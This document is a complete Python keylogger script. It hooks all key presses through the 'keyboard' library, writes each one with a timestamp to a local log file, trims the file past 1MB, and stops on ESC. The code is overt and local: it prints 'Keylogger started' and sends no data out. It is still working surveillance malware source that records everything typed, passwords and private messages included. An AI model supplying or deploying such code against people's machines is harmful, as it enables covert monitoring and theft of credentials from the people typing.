import keyboard
import datetime
from pathlib import Path

# Configuration
LOG_FILE = "keystrokes.log"
MAX_LOG_SIZE = 1024 * 1024  # 1MB max file size

def on_key_press(event):
    """Callback function for key press events"""
    try:
        # Get current timestamp
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        # Log the key information
        with open(LOG_FILE, "a") as f:
            f.write(f"[{timestamp}] {event.name}\n")
            
        # Rotate log if it gets too large
        if Path(LOG_FILE).stat().st_size > MAX_LOG_SIZE:
            rotate_log()
            
    except Exception as e:
        print(f"Error logging key: {e}")

def rotate_log():
    """Rotate the log file when it gets too large"""
    try:
        with open(LOG_FILE, "r") as f:
            contents = f.readlines()
        
        # Keep only the most recent half of the log
        keep_lines = len(contents) // 2
        with open(LOG_FILE, "w") as f:
            f.writelines(contents[-keep_lines:])
            
    except Exception as e:
        print(f"Error rotating log: {e}")

def main():
    print(f"Keylogger started. Logging to {LOG_FILE}")
    print("Press ESC to stop...")
    
    # Set up the key press callback
    keyboard.on_press(on_key_press)
    
    # Wait for ESC key to exit
    keyboard.wait("esc")
    
    print("\nKeylogger stopped.")

if __name__ == "__main__":
    main()